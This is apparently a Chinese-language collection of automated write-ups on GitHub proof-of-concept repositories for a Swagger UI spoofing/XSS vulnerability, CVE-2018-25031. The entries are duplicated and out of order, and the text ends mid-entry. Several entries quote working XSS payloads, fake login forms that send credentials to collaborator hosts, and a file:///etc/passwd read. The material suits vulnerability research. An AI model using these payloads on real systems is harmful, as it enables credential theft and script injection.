CVE-2018-25031 允许远程攻击者发起欺骗攻击。通过诱使用户打开精心制作的URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞利用方式是，攻击者构造包含指向恶意 OpenAPI 定义（例如 test.json 或 test.yaml）的 URL，诱使用户在 Swagger UI 中加载该 URL。Swagger UI 会解析并显示恶意 OpenAPI 定义，从而允许攻击者欺骗用户。提供的PoC代码包含 `test.json` 和 `test.yaml` 两个文件。`test.json` 包含指向 `test.yaml` 的链接，而 `test.yaml` 包含 OpenAPI 定义，其中嵌入了恶意链接 `<a href="https://evil.com">Sitio malicioso</a>`。当 Swagger UI 显示此定义时，恶意链接将被呈现，如果用户点击，可能会被重定向到恶意网站。投毒风险较低，因为主要是通过恶意链接进行欺骗，而不是在代码中直接执行恶意操作。主要风险在于用户交互的部分，如果用户不点击恶意链接，风险相对较小。考虑到Github仓库的可信性未知以及`test.yaml`中存在 `evil.com` 的可疑域名，综合估计投毒风险为10%。

**项目地址:** [h4ckt0m/CVE-2018-25031-test](https://github.com/h4ckt0m/CVE-2018-25031-test)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #9

**来源**: [CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md](../2018/CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2 (也可能存在于更高版本)

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义。根据搜索结果和漏洞信息，该漏洞的PoC是有效的。攻击者可以利用此漏洞，通过加载恶意的OpenAPI定义文件（例如xss.yaml）来欺骗用户，甚至可能执行跨站脚本攻击(XSS)。

**有效性：**

提供的PoC代码是有效的，因为它包含一个README.md文件、用于定义远程OpenAPI定义的JSON文件（poc.json），以及两个YAML文件（poc.yaml和xss.yaml）。其中，xss.yaml包含恶意的JavaScript代码，可以触发XSS攻击。

**投毒风险：**

代码仓库的投毒风险较低，约为10%。虽然xss.yaml文件包含潜在的XSS攻击代码，但它属于PoC的一部分，用于演示漏洞。其他文件看起来是合法的OpenAPI定义文件或配置文件，没有发现明显的恶意代码。但仍需谨慎，因为攻击者可能在OpenAPI定义中嵌入其他类型的恶意行为，例如SSRF攻击。

**利用方式：**

1.  攻击者创建一个包含恶意内容的OpenAPI定义文件(例如xss.yaml，包含`<noscript>`标签尝试注入XSS)。
2.  攻击者将此文件托管在远程服务器上。
3.  攻击者构造一个包含特定参数的URL，诱使用户打开，该URL指向受影响的Swagger UI实例，并指定加载恶意OpenAPI定义文件的URL作为参数。
4.  当用户打开该URL时，Swagger UI会加载并显示恶意OpenAPI定义文件，从而可能导致欺骗或XSS攻击。

总结来说，该漏洞的利用方式是通过欺骗用户加载恶意的OpenAPI定义文件，从而控制Swagger UI的显示内容，甚至执行恶意脚本。

**项目地址:** [hev0x/CVE-2018-25031-PoC](https://github.com/hev0x/CVE-2018-25031-PoC)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #10

**来源**: [CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md](../2018/CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md)

## CVE-2018-25031-Swagger UI Spoofing/SSRF/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或恶意代码执行

**影响版本:** <= 4.1.2 (可能更高版本也受影响)

**利用条件:** 需要目标系统使用存在漏洞版本的Swagger UI，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程 OpenAPI 定义。漏洞利用方式：

1.  **欺骗攻击 (Spoofing):** 攻击者可以托管一个恶意的 OpenAPI 定义（例如 YAML 或 JSON 文件）。
2.  **诱导用户：** 攻击者构建一个包含指向恶意 OpenAPI 定义的 URL。然后，攻击者诱使用户点击此 URL。这可以通过社会工程学或其他技术实现。
3.  **Swagger UI 显示恶意定义：** 当用户访问包含恶意定义的 URL 时，Swagger UI 将加载并显示该恶意定义。
4.  **XSS/信息窃取:** 恶意的 OpenAPI 定义可以包含恶意HTML/JavaScript代码，例如，在`description`字段中插入`<script>`标签或者`<form>`标签，在用户浏览器中执行，从而窃取用户信息（例如cookie）或执行其他恶意操作，比如进行钓鱼。

从提供的漏洞利用代码来看， `poc3.yaml`和`try.yaml` 文件中， `description` 字段包含了`<form>`标签，模拟了一个登录表单，目的是诱骗用户输入用户名和密码，并将这些信息发送到攻击者控制的服务器 `ttqbbaf0yx45z9zqgpmfcvjyhpngbcz1.oastify.com` 。另外，还包含一个`onerror`事件的图像标签，当图片加载失败时，会执行JavaScript代码`alert(document.cookie)`，从而可能泄露用户的cookie信息。 这些代码证明了利用此漏洞执行XSS攻击，窃取用户信息的可能性。

**投毒风险分析:**

虽然主要的攻击向量是利用Swagger UI的缺陷来展示恶意的OpenAPI定义，但代码仓库中存在一定的投毒风险。这种风险主要体现在：

*   攻击者可能会在 YAML/JSON 文件中加入一些隐蔽的恶意代码，例如混淆的 JavaScript 或利用其他漏洞的代码片段。然而，从提供的代码中看，主要利用方式较为直接，没有明显的隐藏后门。
*   仓库本身可能被篡改，虽然代码相对简单，但仓库维护者的身份以及代码的来源都存在一定的不确定性，不能完全排除代码仓库所有者添加恶意代码的可能性。

因此，综合考虑以上因素，判断存在10%的投毒风险。

**项目地址:** [johnlaurance/CVE-2018-25031-test2](https://github.com/johnlaurance/CVE-2018-25031-test2)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #11

**来源**: [CVE-2018-25031-kriso4os_CVE-2018-25031.md](../2018/CVE-2018-25031-kriso4os_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示欺骗/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本攻击 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI中，攻击者可以通过诱使用户打开一个特制的URL，从而显示远程OpenAPI定义。该URL可以指向攻击者控制的服务器，显示恶意的API文档或利用XSS漏洞。根据提供的POC代码，`XSS.yaml`文件中包含一个XSS payload: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>`。当Swagger UI渲染此文件时，会触发`alert(document.domain)`，表明XSS攻击成功。`poc.yaml` 仅包含基本的openapi定义，并未包含任何恶意代码。

**有效性：** 提供的POC代码有效，可以利用该漏洞。

**投毒风险：** 经过分析，提供的POC代码主要用于演示漏洞，未发现作者隐藏的恶意代码。因此，投毒风险为0%。代码中引用的远程yaml文件地址指向githubusercontent.com，如果该代码库被劫持或者作者主动添加恶意代码，则可能产生投毒。

**利用方式：** 
1.  攻击者构建一个包含恶意OpenAPI定义的YAML或JSON文件，其中包含XSS payload，例如`XSS.yaml`。
2.  攻击者创建一个恶意URL，该URL指向受影响的Swagger UI实例，并包含参数，指定要加载的恶意OpenAPI定义文件的URL。
3.  攻击者诱使用户点击该恶意URL。
4.  当用户点击恶意URL后，Swagger UI会加载并渲染攻击者提供的OpenAPI定义文件。
5.  如果OpenAPI定义文件中包含XSS payload，则会在用户的浏览器中执行恶意代码，从而导致跨站脚本攻击。
6.  攻击者可以利用该漏洞窃取用户的敏感信息或执行其他恶意操作。此外，攻击者也可以利用该漏洞进行欺骗攻击，例如显示虚假的API文档，诱导用户进行错误的操作。

**项目地址:** [kriso4os/CVE-2018-25031](https://github.com/kriso4os/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #12

**来源**: [CVE-2018-25031-labeebSabbah_CVE-2018-25031.md](../2018/CVE-2018-25031-labeebSabbah_CVE-2018-25031.md)

## CVE-2018-25031-SwaggerUI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/信息泄露/SSRF

**影响应用:** SwaggerUI

**危害等级:** 中危，可能导致信息泄露和潜在的中间人攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者可以通过诱使用户打开特制的 URL 来显示远程 OpenAPI 定义。攻击者提供的 htmli.json 文件包含指向恶意 htmli.yaml 文件的 URL。htmli.yaml 文件包含一段 HTML 代码，该代码伪造一个登录表单，并将用户输入的 email 和 password 发送到 `http://10.212.234.14/`。因此利用方式是，攻击者诱骗用户点击恶意链接，swaggerUI 加载恶意的 OpenAPI 定义，在 SwaggerUI 界面上展示伪造的登录表单，当用户输入登录信息时，攻击者可以窃取用户的凭据。由于yaml文件内容明确，不包含其它恶意代码，因此投毒风险为0%。利用方式总结：

1.  **漏洞利用：** 攻击者制作包含恶意 OpenAPI 定义的 YAML 文件。
2.  **诱导用户：** 攻击者通过某种方式（例如，电子邮件、社交媒体）诱使用户点击包含恶意 YAML 文件 URL 的链接。
3.  **欺骗：** 当用户点击链接时，Swagger UI 会加载恶意 YAML 文件，并显示其中的内容。攻击者可以在 YAML 文件中嵌入恶意 HTML 或 JavaScript 代码，例如伪造登录表单，诱骗用户输入敏感信息。
4.  **信息窃取：** 如果用户在伪造的登录表单中输入了用户名和密码，这些信息将被发送到攻击者指定的服务器。

**有效性：** 提供的 POC 代码有效，可以重现欺骗攻击。

**利用方式总结：**

攻击者利用 Swagger UI 加载远程 OpenAPI 定义的特性，通过诱骗用户点击恶意链接，加载包含恶意 HTML 代码的 YAML 文件，从而实现欺骗攻击。该漏洞的利用需要用户交互，风险等级为中危。

**项目地址:** [labeebSabbah/CVE-2018-25031](https://github.com/labeebSabbah/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #13

**来源**: [CVE-2018-25031-mathis2001_CVE-2018-25031.md](../2018/CVE-2018-25031-mathis2001_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统使用存在漏洞的Swagger UI版本，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2018-25031 是一个存在于 Swagger UI 4.1.2 及更早版本中的漏洞。攻击者可以诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，造成欺骗攻击。

**有效性：**
提供的 POC 代码有效。通过 `configUrl` 或 `url` 参数，Swagger UI 可以加载远程的 OpenAPI 定义文件（JSON 或 YAML）。

**投毒风险：**
该仓库存在一定的投毒风险，风险为60%。原因如下：

*   **远程加载：** POC 利用了 Swagger UI 加载远程定义文件的功能。攻击者可以控制远程文件的内容。
*   **恶意内容：** `f.yaml` 包含大量的 XSS payload，旨在利用 Swagger UI 中的漏洞执行恶意 JavaScript 代码。例如，`<img src=x oNlY=1 oNerror=alert('xxs')//`  等。
*   **钓鱼攻击：**  `f.yaml` 中包含伪造的登录表单，诱导用户提交敏感信息到攻击者控制的服务器。
*   **SSRF风险：** `f.yaml`中包含`<iframe src=file:///etc/passwd></iframe>`，尝试读取服务器本地文件。
*   **不确定性:** 虽然漏洞利用代码的作者提供了一些payload，但这些payload本身具有攻击性。恶意使用这些Payload,可能会被作者追踪到恶意行为。但作者也可能为了混淆视听，将一些恶意的代码进行隐藏。

**利用方式：**

1.  **发现目标：** 寻找使用了存在漏洞的 Swagger UI 版本的应用。
2.  **构造恶意 URL：**  构造包含 `configUrl` 或 `url` 参数的 URL，指向攻击者控制的 JSON 或 YAML 文件。
3.  **诱骗受害者：**  通过钓鱼或其他方式诱骗受害者点击该 URL。
4.  **执行攻击：**  当受害者访问该 URL 时，Swagger UI 会加载攻击者提供的恶意定义文件，从而执行 XSS 代码或进行其他攻击（例如，窃取 cookie、重定向用户等）。

**总结：**
该漏洞的利用依赖于社会工程学，需要诱骗用户点击恶意链接。攻击者可以利用该漏洞进行钓鱼、XSS 攻击，甚至可能进行 SSRF 攻击。同时，提供的 POC 代码包含多种攻击 Payload，存在较高的投毒风险。

**项目地址:** [mathis2001/CVE-2018-25031](https://github.com/mathis2001/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #14

**来源**: [CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md](../2018/CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md)

## CVE-2018-25031 - Swagger UI SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗攻击

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或重定向到恶意API定义

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI 4.1.2及更早版本中的一个漏洞，允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义，从而欺骗用户。从搜索结果和漏洞描述来看，攻击依赖于用户交互，需要诱导用户点击恶意链接。漏洞利用代码提供了一个简单的`exploit.yaml`文件，该文件定义了一个Swagger API规范，包含标题和描述，可能用于展示SSRF漏洞。如果这个YAML文件托管在攻击者控制的服务器上，并通过恶意链接传递给Swagger UI，则Swagger UI会加载该文件，从而实现欺骗攻击。**有效性：** 提供的POC代码本身并不能直接实现攻击，需要结合构造的URL和受害者点击才能生效，因此属于间接PoC。**投毒风险：** 分析POC代码，`exploit.yaml` 非常简单，仅仅包含swagger版本，info信息。作者投毒可能性较低，但不能完全排除，例如通过引用远程资源或包含恶意脚本，风险评估为10%。**利用方式：** 攻击者构造包含恶意swagger定义文件URL的链接，诱使用户点击。用户点击链接后，Swagger UI加载并显示恶意swagger定义，从而实现欺骗或SSRF攻击。

**项目地址:** [natpakun/SSRF-CVE-2018-25031-](https://github.com/natpakun/SSRF-CVE-2018-25031-)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #15

**来源**: [CVE-2018-25031-nigartest_CVE-2018-25031.md](../2018/CVE-2018-25031-nigartest_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示漏洞

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意脚本执行

**影响版本:** <= 4.1.2 (可能影响更高版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱使用户打开精心制作的 URL，来显示远程的恶意 OpenAPI 定义。根据搜索结果和漏洞库信息，该漏洞的核心在于 Swagger UI 未能充分验证和过滤用户提供的 URL，导致可以加载并渲染来自任意来源的 OpenAPI 定义文件。这使得攻击者可以欺骗用户，展示伪造的 API 文档，甚至通过在 OpenAPI 定义中插入恶意 HTML 或 JavaScript 代码，实现跨站脚本攻击（XSS）。

**有效性：** 提供的 POC 代码有效。`domxss.yaml` 文件包含用于触发 DOM XSS 的恶意代码， `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>` 。 `poc.json` 和 `poc.yaml` 文件用于指定要加载的恶意 OpenAPI 定义文件。

**投毒风险：** 仓库中存在少量投毒风险。`domxss.yaml` 使用了 `otlu3omsk1ath8ur17a2kldtmksbg34s.oastify.com` 作为 `basePath`，这可能用于收集受害者的 IP 地址或进行其他形式的侦察。但核心的 XSS payload 和利用方式比较直接，主要的目的是验证漏洞，投毒的可能性较小。风险比例预估为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的 OpenAPI 定义文件（例如 `domxss.yaml`）。
2.  攻击者将此文件托管在公开可访问的 URL 上（例如 GitHub Raw Content）。
3.  攻击者构造一个包含指向恶意 OpenAPI 定义文件 URL 的链接。
4.  攻击者诱使受害者点击该链接。
5.  受害者的浏览器加载 Swagger UI，并从攻击者指定的 URL 加载恶意 OpenAPI 定义文件。
6.  Swagger UI 渲染恶意 OpenAPI 定义文件，从而执行其中的恶意代码（例如 XSS payload）。

**项目地址:** [nigartest/CVE-2018-25031](https://github.com/nigartest/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #16

**来源**: [CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md](../2018/CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-UI Misrepresentation of Critical Information

**漏洞编号:** CVE-2018-25031

**漏洞类型:** UI Misrepresentation of Critical Information (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户信任被欺骗的API定义，进而遭受钓鱼攻击或其他恶意行为。

**影响版本:** < 4.1.3

**利用条件:** 受害者需要点击攻击者构造的恶意URL。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者可以通过诱骗受害者打开一个特制的URL，该URL指向攻击者控制的OpenAPI定义文件，从而在Swagger UI界面上显示被篡改的信息。这可能导致用户信任恶意API定义，并泄露敏感信息或执行非预期的操作。

**有效性分析：**
根据漏洞信息和搜索引擎结果，该漏洞利用需要用户交互，攻击者通过构造恶意URL，诱导用户点击。POC代码使用Selenium模拟浏览器行为，访问目标Swagger UI页面，并加载恶意的OpenAPI定义文件。如果Swagger UI版本低于4.1.3，则可能受到攻击，界面会显示恶意定义的内容。

**投毒风险分析：**
POC代码主要功能是验证目标Swagger UI是否存在CVE-2018-25031漏洞，通过selenium模拟点击，然后检测response log中是否存在外部恶意链接，从而检测目标是否存在该漏洞。
*   `swagger-exploit.py`: 这个脚本使用Selenium自动化测试，访问目标 Swagger UI 页面，并尝试加载两个恶意的 OpenAPI 定义文件（`hacked1.json` 和 `hacked2.json`）。它会检查网络请求日志，以确定目标是否加载了这些文件。如果加载了，则表明目标存在漏洞。该脚本没有发现任何明显的投毒代码。
*   `README.md`: 这个文件提供了关于如何使用脚本的说明。它包含安装依赖项和运行脚本的说明。也没有发现恶意代码。
所以投毒风险很低。

**利用方式分析：**
1.  攻击者构造包含`configUrl`或`url`参数的恶意URL，指向攻击者控制的OpenAPI定义文件。
2.  攻击者诱骗受害者点击该恶意URL，例如通过钓鱼邮件或社交媒体。
3.  受害者的浏览器加载恶意URL，Swagger UI显示攻击者提供的OpenAPI定义文件。
4.  如果攻击者篡改了API定义文件中的信息，例如API端点、参数说明等，受害者可能会被误导，从而遭受攻击，比如提交敏感信息到错误的端点。

该漏洞是一种客户端漏洞，主要利用用户交互进行攻击，通过欺骗用户信任恶意API定义来实现攻击目标。

**项目地址:** [rafaelcintralopes/SwaggerUI-CVE-2018-25031](https://github.com/rafaelcintralopes/SwaggerUI-CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #17

**来源**: [CVE-2018-25031-rasinfosec_CVE-2018-25031.md](../2018/CVE-2018-25031-rasinfosec_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗

**影响版本:** <= 4.1.2

**利用条件:** 需要目标用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031 漏洞允许远程攻击者进行欺骗攻击。通过诱使用户打开特制的 URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞存在于Swagger UI 4.1.2及更早版本中。提供的POC包含一个json文件和一个yaml文件, json文件中定义了yaml文件的url, yaml文件定义了一个openapi接口。攻击者诱使用户访问包含指向恶意json文件的链接的Swagger UI页面，该JSON文件随后加载并显示恶意的 OpenAPI 定义。 投毒风险较低，主要在于如果利用代码仓库被黑客入侵，替换了 `poc.yaml` 文件内容，可能会将用户引导到恶意网站或执行恶意操作，所以风险存在，但概率较低。

**有效性：** 根据漏洞描述和搜索结果，提供的POC代码有效，可以用于显示远程 OpenAPI 定义，从而达到欺骗的目的。

**投毒风险：** 投毒风险评估为 5%。虽然当前提供的 POC 代码本身只是用于演示欺骗攻击，并不包含直接的恶意代码，但是如果攻击者能够控制 `raw.githubusercontent.com` 上的 `poc.yaml` 文件，他们就可以修改显示的 OpenAPI 定义，例如将其指向恶意网站，或包含 XSS 漏洞等。因此，存在一定的投毒风险，但主要取决于对托管 OpenAPI 定义文件的服务器的控制。 此外此POC需要依赖githubusercontent, 如果此域名被污染也可能会出现安全问题。

**利用方式：**

1.  攻击者创建一个恶意的 OpenAPI 定义文件（例如 `poc.yaml`），该文件可能指向恶意网站或包含其他恶意内容。
2.  攻击者创建一个 JSON 文件（例如 `poc.json`），该文件包含指向恶意 OpenAPI 定义文件的 URL。
3.  攻击者诱使用户访问包含指向恶意 JSON 文件的链接的 Swagger UI 页面，例如通过电子邮件、社交媒体等方式。
4.  Swagger UI 加载恶意 JSON 文件，并显示恶意的 OpenAPI 定义。
5.  用户可能会被欺骗，误以为恶意 OpenAPI 定义来自受信任的来源，从而执行恶意操作。

**项目地址:** [rasinfosec/CVE-2018-25031](https://github.com/rasinfosec/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #18

**来源**: [CVE-2018-25031-wrkk112_CVE-2018-25031.md](../2018/CVE-2018-25031-wrkk112_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 是 Swagger UI 中的一个欺骗漏洞。攻击者可以通过诱导受害者打开一个特制的URL，从而显示远程的 OpenAPI 定义。提供的POC代码展示了利用此漏洞的步骤，包括使用一个包含恶意 OpenAPI 定义的JSON文件。该JSON文件指定了远程的YAML文件，其中ismsxss.yaml包含XSS payload。具体来说，ismsxss.yaml包含一段JavaScript代码（`<img onerror=alert(document.domain) src>`），这段代码会在Swagger UI中执行，从而实现跨站脚本攻击（XSS）。

**有效性：** 根据漏洞信息和POC代码，漏洞是有效的。攻击者通过诱导用户打开包含恶意链接的网页，可以执行XSS攻击。

**投毒风险：** 通过分析提供的POC代码，未发现明显的作者隐藏的投毒代码。虽然POC代码中包含XSS payload，但这是为了验证漏洞的存在，并非恶意投毒。因此，投毒风险为0%。

**利用方式：**

1.  攻击者创建一个包含指向恶意 OpenAPI 定义文件的 URL。
2.  攻击者通过社会工程学等方法诱导受害者点击该 URL。
3.  受害者的 Swagger UI 加载恶意的 OpenAPI 定义文件。
4.  恶意 OpenAPI 定义文件中的 XSS payload 在受害者的浏览器中执行，从而实现攻击目的。例如，可以窃取用户的Cookie或执行其他恶意操作。

**项目地址:** [wrkk112/CVE-2018-25031](https://github.com/wrkk112/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---



---

## POC #7

**来源**: [CVE-2018-25031-h2oa_CVE-2018-25031.md](../2018/CVE-2018-25031-h2oa_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统运行存在漏洞的Swagger UI实例，且受害者点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI中的一个漏洞，允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程OpenAPI定义。漏洞的根本原因是Swagger UI在处理URL输入时存在缺陷，允许攻击者控制Swagger UI加载的API定义来源。

**有效性：**
提供的POC代码有效。`poc.json`指定了要加载的远程OpenAPI定义文件的URL，`poc.yaml`包含了将被显示的恶意API定义。当用户访问包含该URL的Swagger UI页面时，会显示`poc.yaml`中定义的API信息，从而实现欺骗。

**投毒风险：**
该存储库存在一定的投毒风险，约为10%。虽然提供的`poc.json`和`poc.yaml`文件本身没有恶意代码，但攻击者可能通过以下方式进行投毒：

1.  **URL替换：** 攻击者可能会修改`poc.json`中的URL，指向包含恶意JavaScript代码的OpenAPI定义文件，从而在用户访问Swagger UI页面时执行恶意代码（虽然此漏洞主要描述是欺骗，但是不排除被利用做成XSS攻击）。
2.  **协作用户投毒：** 如果存储库允许协作，恶意用户可能会提交包含恶意代码的OpenAPI定义文件。

需要强调的是，目前提供的POC代码主要用于欺骗攻击，旨在展示伪造的API定义。要实现完整的攻击，还需要结合其他漏洞（如XSS）或社工手段。

**利用方式：**
1.  攻击者构造包含指向恶意`poc.json`文件的URL。
2.  攻击者诱使受害者点击该URL。可以通过邮件、社交媒体或其他方式进行诱导。
3.  受害者在其浏览器中打开包含该URL的Swagger UI页面。
4.  Swagger UI加载`poc.json`中指定的远程OpenAPI定义文件（`poc.yaml`）。
5.  Swagger UI显示`poc.yaml`中定义的API信息，受害者看到的是被篡改过的API文档。

**项目地址:** [h2oa/CVE-2018-25031](https://github.com/h2oa/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #8

**来源**: [CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md](../2018/CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing Attack)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意链接传播

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及其他版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。通过诱使用户打开精心制作的URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞利用方式是，攻击者构造包含指向恶意 OpenAPI 定义（例如 test.json 或 test.yaml）的 URL，诱使用户在 Swagger UI 中加载该 URL。Swagger UI 会解析并显示恶意 OpenAPI 定义，从而允许攻击者欺骗用户。提供的PoC代码包含 `test.json` 和 `test.yaml` 两个文件。`test.json` 包含指向 `test.yaml` 的链接，而 `test.yaml` 包含 OpenAPI 定义，其中嵌入了恶意链接 `<a href="https://evil.com">Sitio malicioso</a>`。当 Swagger UI 显示此定义时，恶意链接将被呈现，如果用户点击，可能会被重定向到恶意网站。投毒风险较低，因为主要是通过恶意链接进行欺骗，而不是在代码中直接执行恶意操作。主要风险在于用户交互的部分，如果用户不点击恶意链接，风险相对较小。考虑到Github仓库的可信性未知以及`test.yaml`中存在 `evil.com` 的可疑域名，综合估计投毒风险为10%。

**项目地址:** [h4ckt0m/CVE-2018-25031-test](https://github.com/h4ckt0m/CVE-2018-25031-test)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #9

**来源**: [CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md](../2018/CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2 (也可能存在于更高版本)

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义。根据搜索结果和漏洞信息，该漏洞的PoC是有效的。攻击者可以利用此漏洞，通过加载恶意的OpenAPI定义文件（例如xss.yaml）来欺骗用户，甚至可能执行跨站脚本攻击(XSS)。

**有效性：**

提供的PoC代码是有效的，因为它包含一个README.md文件、用于定义远程OpenAPI定义的JSON文件（poc.json），以及两个YAML文件（poc.yaml和xss.yaml）。其中，xss.yaml包含恶意的JavaScript代码，可以触发XSS攻击。

**投毒风险：**

